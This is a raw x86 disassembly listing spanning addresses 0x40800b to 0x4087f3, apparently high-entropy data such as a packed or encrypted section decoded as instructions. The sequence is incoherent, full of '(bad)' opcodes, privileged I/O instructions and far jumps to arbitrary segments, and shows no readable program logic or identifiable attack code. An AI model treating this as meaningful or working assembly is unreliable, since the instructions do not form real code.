  40800b:	cs stos BYTE PTR es:[edi],al
  40800d:	sbb    eax,DWORD PTR [ebp-0x21]
  408010:	mov    ecx,0xa70b33db
  408015:	adc    eax,edi
  408017:	mov    bh,cl
  408019:	xchg   esi,eax
  40801a:	call   0xd505f17e
  40801f:	adc    DWORD PTR [edx],edi
  408021:	sbb    ah,BYTE PTR [edi-0x76]
  408024:	mov    cl,0x78
  408026:	stc    
  408027:	xchg   DWORD PTR [ebp-0x4a],esi
  40802a:	stc    
  40802b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40802c:	cwde   
  40802d:	fstp   QWORD PTR [ecx+0x2d]
  408030:	sbb    esp,eax
  408032:	or     DWORD PTR [edx-0x76018478],edi
  408038:	pop    ebx
  408039:	jl     0x408086
  40803b:	inc    esp
  40803c:	in     al,dx
  40803d:	pusha  
  40803e:	inc    ebp
  40803f:	cld    
  408040:	mov    edi,0x32b43c30
  408045:	(bad)  
  408046:	and    cl,ch
  408048:	dec    ecx
  408049:	dec    ebx
  40804a:	jo     0x408040
  40804c:	adc    eax,0xfdc8fe7e
  408051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408052:	fstp   TBYTE PTR [eax]
  408054:	hlt    
  408055:	daa    
  408056:	push   0x31
  408058:	xchg   BYTE PTR [ecx-0x6016df25],dh
  40805e:	xchg   edx,ecx
  408060:	cmp    ebp,edi
  408062:	mov    cl,0xc5
  408064:	call   0xc162c22
  408069:	paddd  mm4,QWORD PTR [ebx+edx*4+0x219fd0ec]
  408071:	lods   eax,DWORD PTR ds:[esi]
  408072:	cmc    
  408073:	and    edx,ecx
  408075:	rcr    DWORD PTR [edi+0x673a38c8],cl
  40807b:	push   0xffffff9b
  40807d:	pop    es
  40807e:	xor    al,0x45
  408080:	cld    
  408081:	pop    edx
  408082:	mov    edi,DWORD PTR [ebx-0x2626c386]
  408088:	xchg   edx,eax
  408089:	push   ss
  40808a:	sbb    eax,0x30dc4cfb
  40808f:	adc    al,0x3e
  408091:	sti    
  408092:	imul   edi,DWORD PTR [ecx+0x385e88ed],0xffffffbf
  408099:	and    DWORD PTR [edi+0x75],eax
  40809c:	sub    ebp,DWORD PTR [ebp+0x1de5d89]
  4080a2:	inc    BYTE PTR [esi-0x22]
  4080a5:	adc    DWORD PTR [ecx+edi*1+0x6d],ecx
  4080a9:	jmp    0x4080f9
  4080ab:	loop   0x40811d
  4080ad:	mov    dl,BYTE PTR [ecx-0x520b6cea]
  4080b3:	mov    BYTE PTR [eax+0x6ab218af],dh
  4080b9:	call   0x3646:0x8e8cb868
  4080c0:	adc    esp,ebp
  4080c2:	and    esp,ebx
  4080c4:	cmc    
  4080c5:	ficomp WORD PTR [ecx-0x8359891]
  4080cb:	mov    esi,0x15252ee8
  4080d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080d1:	push   ebx
  4080d2:	jb     0x40808c
  4080d4:	nop
  4080d5:	cmp    al,0xf0
  4080d7:	add    BYTE PTR [edi+0x21],0x77
  4080db:	or     DWORD PTR [ebp+0x56],ecx
  4080de:	(bad)  
  4080e0:	jnp    0x408134
  4080e2:	inc    ebx
  4080e3:	jp     0x408128
  4080e5:	loopne 0x408078
  4080e7:	in     al,dx
  4080e8:	dec    edx
  4080e9:	stos   DWORD PTR es:[edi],eax
  4080ea:	imul   edi,ecx,0x66f2548
  4080f0:	cld    
  4080f1:	ja     0x4080a7
  4080f3:	mov    ds:0xa1a6cfee,al
  4080f8:	fmul   DWORD PTR [edi+0x2bf1185b]
  4080fe:	add    esp,DWORD PTR [eax+edi*2-0x4f]
  408102:	loop   0x408094
  408104:	bound  ebx,QWORD PTR [ebp-0x50]
  408107:	jp     0x40809b
  408109:	jg     0x40813c
  40810b:	mov    ch,0x3a
  40810d:	rcr    BYTE PTR [edi],1
  40810f:	mov    ds:0x72de3458,eax
  408114:	xor    BYTE PTR [edi-0x554418d5],bl
  40811a:	adc    ecx,ebp
  40811c:	retf   0xf21e
  40811f:	cs ds test eax,0xc15eee3d
  408126:	ins    BYTE PTR es:[edi],dx
  408127:	mov    eax,ds:0x35c0878c
  40812c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40812d:	dec    esp
  40812e:	cdq    
  40812f:	cld    
  408130:	mov    ah,BYTE PTR [edx+0x156e1c48]
  408136:	daa    
  408137:	mov    dl,0xde
  408139:	bound  esp,QWORD PTR [edx]
  40813b:	jo     0x4080ed
  40813d:	inc    edx
  40813e:	loope  0x408117
  408140:	rcr    DWORD PTR [esi+0x61],1
  408143:	jb     0x408140
  408145:	inc    esp
  408146:	jmp    0xc5a5:0x13d8a48c
  40814d:	call   0x1e761a52
  408152:	sub    DWORD PTR [ecx],eax
  408154:	js     0x4080e3
  408156:	pop    ss
  408157:	gs push 0xffffffce
  40815a:	repz into 
  40815c:	cmp    esp,DWORD PTR [esi+0x7b97fe77]
  408162:	loop   0x40811e
  408164:	rol    BYTE PTR [eax-0xd82061a],cl
  40816a:	and    eax,esi
  40816c:	(bad)  
  40816d:	jmp    0xcc5773e5
  408172:	addr16 sti 
  408174:	or     BYTE PTR [ebp+edx*4-0x51485a2d],bl
  40817b:	pop    edi
  40817c:	outs   dx,BYTE PTR ds:[esi]
  40817d:	xlat   BYTE PTR ds:[ebx]
  40817e:	mov    ds:0xfe09f2eb,al
  408183:	shl    DWORD PTR [ecx-0x36],cl
  408186:	or     eax,0xadbe1543
  40818b:	out    0xae,eax
  40818d:	es out dx,al
  40818f:	inc    esi
  408190:	mov    DWORD PTR [ecx-0x12fc3169],edi
  408196:	mov    bh,0x7f
  408198:	mov    ebx,0x4e500af
  40819d:	loopne 0x408121
  40819f:	xor    BYTE PTR [ecx+0x5a],ch
  4081a2:	loop   0x408219
  4081a4:	pop    eax
  4081a5:	mov    edx,0xc8752ecd
  4081aa:	push   cs
  4081ab:	xlat   BYTE PTR ds:[ebx]
  4081ac:	imul   esi,edi,0x7b
  4081af:	mov    ?,WORD PTR [edx]
  4081b1:	arpl   WORD PTR ds:0x79605ccc,bx
  4081b7:	je     0x408210
  4081b9:	test   BYTE PTR [edx-0xb],ch
  4081bc:	xlat   BYTE PTR ds:[ebx]
  4081bd:	mov    ss,WORD PTR [ecx+0x1d823bb3]
  4081c3:	sbb    al,0x91
  4081c5:	push   esp
  4081c6:	or     ecx,DWORD PTR [ecx-0x59]
  4081c9:	xchg   BYTE PTR [edi-0x1216d7a4],dh
  4081cf:	inc    ebx
  4081d0:	jge    0x4081e3
  4081d2:	lods   al,BYTE PTR ds:[esi]
  4081d3:	push   edi
  4081d5:	sub    ah,BYTE PTR [edi]
  4081d7:	xor    ecx,DWORD PTR [edi]
  4081d9:	in     eax,dx
  4081da:	dec    ecx
  4081db:	fcomp  st(3)
  4081dd:	mul    BYTE PTR [edi]
  4081df:	pop    ds
  4081e0:	int    0x2a
  4081e2:	mov    eax,ds:0xd371c353
  4081e7:	sbb    dl,dh
  4081e9:	xor    edx,ecx
  4081eb:	push   eax
  4081ec:	mov    WORD PTR [ebx+0x69],fs
  4081ef:	scas   al,BYTE PTR es:[edi]
  4081f0:	jno    0x408256
  4081f2:	sbb    BYTE PTR [edx],dh
  4081f4:	add    al,cl
  4081f6:	bound  eax,QWORD PTR [edx]
  4081f8:	xchg   ebp,eax
  4081f9:	in     eax,dx
  4081fa:	test   dh,bh
  4081fc:	pop    edx
  4081fd:	jns    0x408189
  4081ff:	xor    esi,ebx
  408201:	inc    esp
  408202:	fstp   DWORD PTR [edi+0x6dba2826]
  408208:	and    BYTE PTR [ebx-0x41],bl
  40820b:	shl    DWORD PTR [ebp-0x44],0x97
  40820f:	es xchg edi,eax
  408211:	jno    0x408208
  408213:	out    dx,eax
  408214:	xchg   BYTE PTR [eax-0x66],dh
  408217:	push   cs
  408218:	popa   
  408219:	cmp    al,0x49
  40821b:	or     ebx,edi
  40821d:	out    dx,eax
  40821e:	push   ebp
  40821f:	dec    esi
  408220:	cmp    al,0x7c
  408222:	mov    al,ds:0x1b0c39b0
  408227:	and    eax,0xe5af00de
  40822c:	cld    
  40822d:	(bad)  
  40822e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40822f:	cmp    eax,0x972271d2
  408234:	inc    ebx
  408235:	popf   
  408236:	daa    
  408237:	mov    ch,BYTE PTR [eax]
  408239:	leave  
  40823a:	leave  
  40823b:	mov    ebx,0xacd2bd15
  408240:	pop    esi
  408241:	add    al,0xb0
  408243:	retf   0xb0ba
  408246:	rcl    BYTE PTR [ebx],cl
  408248:	pop    ss
  408249:	jge    0x4082a5
  40824b:	mov    al,ds:0xb6d82c8c
  408250:	dec    esi
  408251:	xchg   esp,eax
  408252:	mov    al,ds:0xb3d02bf3
  408257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408258:	push   ecx
  408259:	loopne 0x4081fd
  40825b:	out    0x3e,al
  40825d:	xlat   BYTE PTR ds:[ebx]
  40825e:	(bad)  
  40825f:	sti    
  408260:	add    DWORD PTR [ebx+0x26],esi
  408263:	dec    ebx
  408264:	popa   
  408265:	mov    al,0xac
  408267:	int    0xaf
  408269:	push   ds
  40826a:	pusha  
  40826b:	je     0x4082da
  40826d:	inc    ecx
  40826e:	sti    
  40826f:	xchg   esi,eax
  408270:	add    edx,DWORD PTR [edi]
  408272:	push   0x4c
  408274:	pop    esi
  408275:	jae    0x4082ef
  408277:	fwait
  408278:	mov    ds:0x9b42ded5,eax
  40827d:	ret    
  40827e:	inc    ebx
  40827f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408280:	sete   BYTE PTR [ecx-0x2128c33a]
  408287:	(bad)  
  408288:	mov    ch,0x9e
  40828a:	xchg   WORD PTR [ebx],si
  40828d:	repz and edi,DWORD PTR [eax-0x7d]
  408291:	out    dx,al
  408292:	jg     0x4082be
  408294:	rcr    DWORD PTR [edi-0x310e3c5c],0xc7
  40829b:	add    al,0x92
  40829d:	scas   al,BYTE PTR es:[edi]
  40829e:	jmp    0x9c62bcde
  4082a3:	mov    dh,0x37
  4082a5:	push   edi
  4082a6:	pop    esi
  4082a7:	sbb    bl,al
  4082a9:	ds pusha 
  4082ab:	and    BYTE PTR ds:0xb3ab9a1f,dh
  4082b1:	in     eax,dx
  4082b2:	rcr    DWORD PTR [ebx],0xdd
  4082b5:	mov    ecx,0xfff5a54f
  4082ba:	out    0xb4,al
  4082bc:	push   edx
  4082bd:	ins    BYTE PTR es:[edi],dx
  4082be:	adc    DWORD PTR [edi],ebx
  4082c0:	push   0x68
  4082c2:	jns    0x408317
  4082c4:	pop    esi
  4082c5:	mov    esp,0x9a4ee74c
  4082ca:	ins    BYTE PTR es:[edi],dx
  4082cb:	and    al,0x3
  4082cd:	add    BYTE PTR [ebx+edi*8],ch
  4082d0:	ds retf 
  4082d2:	sahf   
  4082d3:	xchg   ecx,eax
  4082d4:	das    
  4082d5:	mov    ecx,0x4a860dfc
  4082da:	into   
  4082db:	push   0xffffff93
  4082dd:	clc    
  4082de:	jle    0x40831c
  4082e0:	into   
  4082e1:	ins    BYTE PTR es:[edi],dx
  4082e2:	pop    edi
  4082e3:	fadd   DWORD PTR [ebp+0x1f8a7019]
  4082e9:	mov    al,ds:0x4dffea25
  4082ee:	aas    
  4082ef:	cs mov dh,0xb9
  4082f2:	loope  0x4082a5
  4082f4:	mov    bh,0x1c
  4082f6:	or     edi,esi
  4082f8:	test   eax,0x766bd0e7
  4082fd:	inc    edx
  4082fe:	sbb    al,BYTE PTR [ecx+0x55]
  408301:	inc    esi
  408302:	js     0x4082dd
  408304:	popf   
  408305:	mov    dl,0x26
  408307:	aas    
  408308:	add    eax,0x24e8d3a
  40830d:	scas   eax,DWORD PTR es:[edi]
  40830e:	lock ja 0x408386
  408311:	jb     0x4082f8
  408313:	lea    esi,[edx+0x494d1e21]
  408319:	cli    
  40831a:	icebp  
  40831b:	dec    esp
  40831c:	das    
  40831d:	int    0x54
  40831f:	xor    al,0xd8
  408321:	sbb    al,0x26
  408323:	cmp    al,0xd5
  408325:	pop    edi
  408326:	xor    DWORD PTR [eax+eiz*8-0x26],edx
  40832a:	jp     0x40838f
  40832c:	adc    DWORD PTR [ebp+0x3a],edx
  40832f:	cmp    eax,0x1b7791d4
  408334:	pop    ebp
  408335:	xchg   ebp,eax
  408336:	push   cs
  408337:	mov    dh,bh
  408339:	shr    DWORD PTR [esi-0x52],0xc4
  40833d:	cs and eax,0x659a01e6
  408343:	add    DWORD PTR [ebp-0x7993331c],eax
  408349:	inc    esp
  40834a:	dec    ebx
  40834b:	cmp    dl,ah
  40834d:	lahf   
  40834e:	jp     0x4082fc
  408350:	sbb    dl,BYTE PTR [esi-0x4e]
  408353:	add    eax,0xfbe2fc39
  408358:	in     al,0xe4
  40835a:	lea    edx,[ecx-0x79a9318b]
  408360:	push   ebx
  408361:	mov    edx,0x74173ecb
  408366:	cmova  ecx,DWORD PTR ds:0x2f61c1d8
  40836d:	mov    edx,0xd0b8ec0e
  408372:	inc    ecx
  408373:	sbb    BYTE PTR [ecx],0xfa
  408376:	mov    eax,0xbcc6aec8
  40837b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40837c:	in     eax,0x48
  40837e:	mov    al,0x26
  408380:	or     al,0x60
  408382:	retf   0xb0e2
  408385:	pop    ebx
  408386:	mov    al,ds:0x5d0e37a2
  40838b:	call   0x454c:0x42b514fc
  408392:	fmul   QWORD PTR [ebp-0x4d31a05a]
  408398:	and    DWORD PTR [edi+0x10e40bdb],esi
  40839e:	xchg   DWORD PTR [esi+ebx*8-0x54152eb2],ebx
  4083a5:	imul   edx,DWORD PTR [eax+ebx*1-0x72],0x9ef3f1fd
  4083ad:	pop    ss
  4083ae:	fsubr  DWORD PTR [edi+eax*1-0x6bb93b7d]
  4083b5:	sub    eax,0x548fcd83
  4083ba:	dec    ebp
  4083bb:	in     eax,dx
  4083bc:	dec    edx
  4083bd:	jmp    0x414:0x109c2587
  4083c4:	cmp    edx,esp
  4083c6:	mov    dh,dl
  4083c8:	xchg   ecx,eax
  4083c9:	or     al,0x1a
  4083cb:	jmp    0x4083e7
  4083cd:	adc    ecx,DWORD PTR [edx-0x75b537bf]
  4083d3:	repz pop esi
  4083d5:	xchg   ebx,eax
  4083d6:	(bad)  
  4083d7:	push   ss
  4083d8:	mov    esp,0xe85eef16
  4083dd:	loope  0x4083f2
  4083df:	daa    
  4083e0:	out    0xb1,eax
  4083e2:	jl     0x408398
  4083e4:	xchg   ebx,eax
  4083e5:	or     esi,DWORD PTR [ebx-0x61]
  4083e8:	push   cs
  4083e9:	je     0x40838c
  4083eb:	addr16 jno 0x408384
  4083ee:	mov    eax,ds:0xfd2aba0b
  4083f3:	add    eax,0xd84dc026
  4083f8:	mov    edx,0x42751c3f
  4083fd:	inc    ebp
  4083fe:	sbb    eax,0x356cb78e
  408403:	imul   BYTE PTR [ecx+0x1c923917]
  408409:	or     BYTE PTR ds:0x7f677e73,bl
  40840f:	call   0xafbf:0x6521c6ab
  408416:	add    dl,BYTE PTR [edx]
  408418:	sahf   
  408419:	xchg   ebp,eax
  40841a:	inc    eax
  40841b:	rol    DWORD PTR [ebp+0x577bdc62],1
  408421:	fild   QWORD PTR [ecx-0x45fc6bd8]
  408427:	ins    BYTE PTR es:[edi],dx
  408428:	retf   0xea1
  40842b:	add    ah,BYTE PTR [ecx+ebp*2]
  40842e:	pop    edi
  40842f:	push   edi
  408430:	xor    bl,BYTE PTR [ecx]
  408432:	mov    ebp,0x93dae8de
  408437:	iret   
  408438:	popf   
  408439:	ret    0x3127
  40843c:	(bad)  
  40843d:	fld    st(2)
  40843f:	jnp    0x408454
  408441:	lock push ds
  408443:	mov    ebx,0xa91e4b55
  408448:	out    dx,al
  408449:	hlt    
  40844a:	loopne 0x40849d
  40844c:	pop    edx
  40844d:	or     BYTE PTR [esi+ebx*1],0x81
  408451:	je     0x4083fd
  408453:	mov    ebp,0xa2d82f83
  408458:	int3   
  408459:	adc    eax,0x9263021
  40845e:	aam    0xb4
  408460:	push   eax
  408461:	xor    ecx,ebx
  408463:	jae    0x40849e
  408465:	xor    dl,BYTE PTR [ebp+0x41]
  408468:	clc    
  408469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40846a:	ins    BYTE PTR es:[edi],dx
  40846b:	jne    0x408415
  40846d:	imul   ebp,DWORD PTR [edx-0x49232635],0x26cef6b2
  408477:	es neg DWORD PTR es:[ebp+0x26c862e4]
  40847f:	loope  0x40849a
  408481:	sbb    al,0xf2
  408483:	popf   
  408484:	fs jge 0x40843c
  408487:	pop    ecx
  408488:	arpl   WORD PTR [ebp-0x4],bx
  40848b:	push   edx
  40848c:	mov    cl,0x5d
  40848e:	dec    edx
  40848f:	and    ah,ch
  408491:	add    eax,0xfc036d58
  408496:	inc    edx
  408497:	in     eax,dx
  408498:	inc    esp
  408499:	dec    ebp
  40849a:	inc    ebp
  40849b:	test   eax,0x35cc12b0
  4084a0:	pop    esi
  4084a1:	pusha  
  4084a2:	(bad)  
  4084a3:	faddp  st(3),st
  4084a5:	mov    ebx,0x8c3b6510
  4084aa:	es xor al,0xd0
  4084ad:	popa   
  4084ae:	int    0x38
  4084b0:	xor    bh,bl
  4084b2:	cmove  eax,edi
  4084b5:	pop    es
  4084b6:	dec    esi
  4084b7:	mov    esp,0xb57d07eb
  4084bc:	mov    ds:0xa4e3e715,eax
  4084c1:	retf   
  4084c2:	ss jnp 0x4084db
  4084c5:	cmp    al,0xe7
  4084c7:	ins    DWORD PTR es:[edi],dx
  4084c8:	mov    dh,0x41
  4084ca:	fisub  WORD PTR [esi]
  4084cc:	das    
  4084cd:	enter  0x271d,0x2c
  4084d1:	jmp    0x4084f5
  4084d3:	sub    al,al
  4084d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d6:	xor    eax,0x8f5eafba
  4084db:	jb     0x408489
  4084dd:	jge    0x408512
  4084df:	dec    ecx
  4084e0:	cmc    
  4084e1:	jmp    0xc06:0x74eaef6c
  4084e8:	xor    al,0xb8
  4084ea:	(bad)  
  4084eb:	into   
  4084ec:	sahf   
  4084ed:	push   cs
  4084ee:	repnz fnstsw WORD PTR [ecx+0x111f6852]
  4084f5:	dec    ebx
  4084f6:	retf   
  4084f7:	inc    eax
  4084f8:	std    
  4084f9:	aam    0x85
  4084fb:	lods   eax,DWORD PTR ds:[esi]
  4084fc:	mov    ds:0xd813941b,eax
  408501:	fcom   QWORD PTR [edi]
  408503:	and    BYTE PTR [ecx+0x23],cl
  408506:	fistp  QWORD PTR [ebx-0x61]
  408509:	mov    dl,al
  40850b:	mov    ds:0x58e7d72f,eax
  408510:	aad    0x7e
  408512:	jo     0x408562
  408514:	lea    esp,[ebp+eax*1-0xd477472]
  40851b:	ficomp DWORD PTR [edx+eax*1-0x4e]
  40851f:	jno    0x4084e9
  408521:	add    al,0x98
  408523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408524:	or     al,0xda
  408526:	lds    edi,FWORD PTR ds:0xbe19a273
  40852c:	mov    dh,dl
  40852e:	(bad)  
  408530:	imul   ecx,DWORD PTR [edx-0x6acfad70],0x31
  408537:	jns    0x408523
  408539:	mov    edi,?
  40853b:	push   es
  40853c:	xor    eax,0xd6fd98a0
  408541:	jp     0x40854f
  408543:	xchg   esi,eax
  408544:	je     0x40856c
  408546:	pop    esi
  408547:	aad    0xbf
  408549:	cmp    eax,0x767eac64
  40854e:	lea    ebx,[ebp-0x13]
  408551:	xchg   esp,eax
  408552:	mov    ds:0xd085fb66,al
  408557:	cld    
  408558:	fisttp DWORD PTR [esi+0x5]
  40855b:	dec    ebx
  40855c:	and    ah,BYTE PTR [eax-0x43421cbe]
  408562:	push   esi
  408563:	mov    ebx,0xb2f871b3
  408568:	sub    ah,BYTE PTR [eax]
  40856a:	pushf  
  40856b:	lock pop esi
  40856d:	and    DWORD PTR [esi],0xb0eb2d7d
  408573:	mov    edx,0xe843a95f
  408578:	jne    0x408574
  40857a:	mov    ebp,0x8e59aeff
  40857f:	je     0x408507
  408581:	(bad)  
  408582:	or     al,0xaa
  408584:	or     dh,ah
  408586:	push   ebp
  408587:	mov    ds,WORD PTR [edx]
  408589:	jb     0x40856a
  40858b:	fld    DWORD PTR [esi]
  40858d:	push   es
  40858e:	mov    esp,edi
  408590:	or     eax,0xb1440989
  408595:	std    
  408596:	xchg   ebp,eax
  408597:	ret    
  408598:	sub    ebp,DWORD PTR [ecx+eax*4]
  40859b:	jns    0x408549
  40859d:	out    dx,al
  40859e:	rcr    DWORD PTR [ebx],1
  4085a0:	or     esi,eax
  4085a2:	add    al,0x6a
  4085a4:	fmul   QWORD PTR [ebx-0x28]
  4085a7:	xchg   bh,bl
  4085a9:	mov    bl,0xa9
  4085ab:	(bad)  
  4085ac:	adc    BYTE PTR [edx-0xf],bl
  4085af:	pop    ds
  4085b0:	pop    esi
  4085b1:	or     DWORD PTR [esi],ebp
  4085b3:	lds    ecx,FWORD PTR [ebp+edi*1-0x6a]
  4085b7:	sbb    BYTE PTR [ebp-0x5186d759],al
  4085bd:	push   ebp
  4085be:	ret    
  4085bf:	repnz adc al,0x15
  4085c2:	adc    dl,BYTE PTR [eax-0x15]
  4085c5:	cmp    al,0xc9
  4085c7:	popf   
  4085c8:	punpcklwd mm6,DWORD PTR [ebx-0x3795d6b7]
  4085cf:	test   DWORD PTR [edi],edi
  4085d1:	mov    edi,0x18e036bf
  4085d6:	out    dx,al
  4085d7:	push   esi
  4085d8:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  4085df:	mov    eax,DWORD PTR [ebp-0x4]
  4085e2:	jmp    0x40a991
  4085e7:	sbb    eax,0x84488431
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffff9a
  4085f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f5:	sub    eax,0x83197904
  4085fa:	xor    ecx,0x60
  4085fd:	add    DWORD PTR [ebx+0x2220f147],0xfffffff3
  408604:	jb     0x408636
  408606:	add    eax,0x51caa471
  40860b:	ja     0x4085e0
  40860d:	xchg   DWORD PTR [edi+0x4a],ebp
  408610:	cmp    edx,edi
  408612:	lods   al,BYTE PTR ds:[esi]
  408613:	lea    ebx,[edx-0x4a5aa4b5]
  408619:	push   esp
  40861a:	sub    dl,dh
  40861c:	sub    BYTE PTR [edi-0x3735f332],dh
  408622:	push   ebp
  408623:	adc    ch,BYTE PTR [esi+0x7ad89151]
  408629:	inc    edi
  40862a:	inc    ebp
  40862b:	ja     0x40865b
  40862d:	xlat   BYTE PTR ds:[ebx]
  40862e:	add    ebx,DWORD PTR [edx]
  408630:	jae    0x4085ff
  408632:	cmovno ecx,DWORD PTR [eax-0x3b]
  408636:	sub    eax,0x41845546
  40863b:	test   al,0xc1
  40863d:	dec    edx
  40863e:	int3   
  40863f:	push   0xc9c940e7
  408644:	cs cli 
  408646:	pop    edi
  408647:	je     0x4085e8
  408649:	stc    
  40864a:	adc    edx,edi
  40864c:	and    dh,al
  40864e:	inc    ecx
  40864f:	jne    0x4085de
  408651:	retf   0x8cdd
  408654:	xchg   esp,eax
  408655:	ret    
  408656:	lds    esi,FWORD PTR [ebx-0x2d]
  408659:	sbb    DWORD PTR [edx],0xffffffda
  40865c:	xchg   DWORD PTR [ecx],edx
  40865e:	mov    ecx,0x1c2f3f85
  408663:	pushf  
  408664:	adc    eax,0xce8c5131
  408669:	cmc    
  40866a:	int3   
  40866b:	xchg   BYTE PTR [eax],ch
  40866d:	ja     0x408619
  40866f:	nop    edx
  408672:	sub    BYTE PTR [ebp-0x2c87cced],al
  408678:	push   0x12d1df3c
  40867d:	fs push esp
  40867f:	push   esi
  408680:	adc    eax,0x830bd2
  408685:	fld    DWORD PTR [edx-0x1f96d119]
  40868b:	push   eax
  40868c:	mov    dh,0x6f
  40868e:	sbb    al,0x6a
  408690:	stos   BYTE PTR es:[edi],al
  408691:	cmp    al,0xf0
  408693:	push   ss
  408694:	add    BYTE PTR ds:0x1cc48cc4,ah
  40869a:	jmp    0x39f9:0x4aae345c
  4086a1:	push   0xffffff92
  4086a3:	push   edx
  4086a4:	jge    0x408666
  4086a6:	pusha  
  4086a7:	pop    edx
  4086a8:	push   ebp
  4086a9:	pop    edx
  4086aa:	fs stos BYTE PTR es:[edi],al
  4086ac:	sbb    BYTE PTR [edi],ah
  4086ae:	repz xchg esp,eax
  4086b0:	add    cl,dl
  4086b2:	xchg   ecx,eax
  4086b3:	inc    edi
  4086b4:	xchg   BYTE PTR [eax],bl
  4086b6:	xchg   edi,eax
  4086b7:	lea    ebp,[edx+0x11ea926c]
  4086bd:	pop    esp
  4086be:	mov    al,0x6e
  4086c0:	je     0x408683
  4086c2:	inc    esp
  4086c3:	mul    BYTE PTR [edi]
  4086c5:	outs   dx,DWORD PTR ds:[esi]
  4086c6:	imul   DWORD PTR [ecx+0x48]
  4086c9:	or     eax,0xbbec095
  4086ce:	cmp    BYTE PTR [edi],bh
  4086d0:	mov    al,ds:0x167499a8
  4086d6:	xchg   DWORD PTR fs:[ebp+eax*8+0x4a],esp
  4086db:	dec    ecx
  4086dc:	mov    ebx,0x93f567b7
  4086e1:	pop    esp
  4086e2:	jae    0x4086aa
  4086e4:	jne    0x408700
  4086e6:	in     al,0x86
  4086e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086e9:	mov    BYTE PTR [esi-0x1caa6f42],ch
  4086ef:	(bad)  
  4086f0:	sub    ah,BYTE PTR [ebp+0x59]
  4086f3:	adc    DWORD PTR [esi+0x610cd034],esi
  4086f9:	fs dec esp
  4086fb:	mov    eax,DWORD PTR [ebx+0x24]
  4086fe:	inc    ebx
  4086ff:	pop    esp
  408700:	inc    eax
  408701:	jb     0x4086b9
  408703:	jae    0x4086f3
  408705:	fcom   QWORD PTR [edx]
  408707:	xchg   edx,eax
  408708:	jmp    0x4086c4
  40870a:	sbb    bh,dl
  40870c:	cmp    BYTE PTR [edx-0x3b],ch
  40870f:	sbb    BYTE PTR [eax],dh
  408711:	dec    edx
  408712:	mov    bl,0x4a
  408714:	push   es
  408715:	loopne 0x40870e
  408717:	in     eax,0xd7
  408719:	xchg   edi,eax
  40871a:	mov    bx,0xbdcf
  40871e:	jg     0x4086e9
  408720:	out    0x0,al
  408722:	loope  0x4086b2
  408724:	out    0x31,eax
  408726:	or     eax,DWORD PTR fs:[edi]
  408729:	cmp    DWORD PTR cs:0x26947794,edx
  408730:	int3   
  408731:	fimul  DWORD PTR [esi]
  408733:	int    0x53
  408735:	loop   0x408753
  408737:	mov    ebx,0xd548a6a0
  40873c:	sub    dh,bl
  40873e:	and    BYTE PTR [edi],bl
  408740:	add    edx,ecx
  408742:	or     cl,BYTE PTR [ecx+0x523221f2]
  408748:	scas   al,BYTE PTR es:[edi]
  408749:	push   esp
  40874a:	cmc    
  40874b:	pop    eax
  40874c:	inc    ebx
  40874d:	ins    DWORD PTR es:[edi],dx
  40874e:	subps  xmm2,xmm7
  408751:	inc    ecx
  408752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408753:	inc    edx
  408754:	mov    bh,0xfb
  408756:	xchg   esi,eax
  408757:	lods   eax,DWORD PTR ds:[esi]
  408758:	imul   DWORD PTR [edx]
  40875a:	rcl    ecx,1
  40875c:	imul   eax,esi,0xffffffb2
  40875f:	ss cdq 
  408761:	push   cs
  408762:	dec    ecx
  408763:	and    BYTE PTR [ebx],0x1
  408766:	pop    eax
  408767:	stc    
  408768:	push   esi
  408769:	push   ecx
  40876a:	repnz call FWORD PTR [ecx-0x2e9adaba]
  408771:	xor    eax,0xd819f10a
  408776:	dec    ecx
  408777:	loopne 0x4087cb
  408779:	fadd   QWORD PTR [ebx]
  40877b:	dec    ebp
  40877c:	loope  0x4087d2
  40877e:	leave  
  40877f:	push   ds
  408780:	jl     0x4087ae
  408782:	rol    ecx,0x3a
  408785:	adc    cl,BYTE PTR [edx]
  408787:	and    ebp,DWORD PTR [eax+0x696268c1]
  40878d:	push   ss
  40878e:	add    cl,BYTE PTR [esi]
  408790:	pop    esp
  408791:	sub    ebx,DWORD PTR [eax-0x6b]
  408794:	iret   
  408795:	push   ebp
  408796:	cli    
  408797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408798:	dec    edi
  408799:	out    0x39,eax
  40879b:	in     eax,0x2e
  40879d:	es pop ebx
  40879f:	nop
  4087a0:	daa    
  4087a1:	sbb    edi,esp
  4087a3:	cmc    
  4087a4:	sbb    dl,BYTE PTR [ebx-0x468dc538]
  4087aa:	out    0x8b,eax
  4087ac:	jmp    0x16fa:0xaee1a1b1
  4087b3:	fisttp WORD PTR [edx+0x23]
  4087b6:	xchg   eax,ebx
  4087b8:	stos   DWORD PTR es:[edi],eax
  4087b9:	mov    ah,0xb2
  4087bb:	fimul  DWORD PTR [ebp+0x535c154a]
  4087c1:	test   al,cl
  4087c3:	test   eax,0xd4181807
  4087c8:	cmc    
  4087c9:	inc    esp
  4087ca:	ss sahf 
  4087cc:	cmp    DWORD PTR [esi],ebx
  4087ce:	dec    ecx
  4087cf:	leave  
  4087d0:	cdq    
  4087d1:	xlat   BYTE PTR ds:[ebx]
  4087d2:	jle    0x4087c1
  4087d4:	test   BYTE PTR [ecx+0x3602ec1c],bh
  4087da:	imul   esp,DWORD PTR [ebp-0x40],0xf0962290
  4087e1:	stc    
  4087e2:	retf   
  4087e3:	lahf   
  4087e4:	scas   al,BYTE PTR es:[edi]
  4087e5:	mov    ecx,0x51e22fe9
  4087ea:	push   es
  4087eb:	and    ch,BYTE PTR ds:0x950ae286
  4087f1:	cmp    DWORD PTR [eax],edi
  4087f3:	fnstenv [eax]
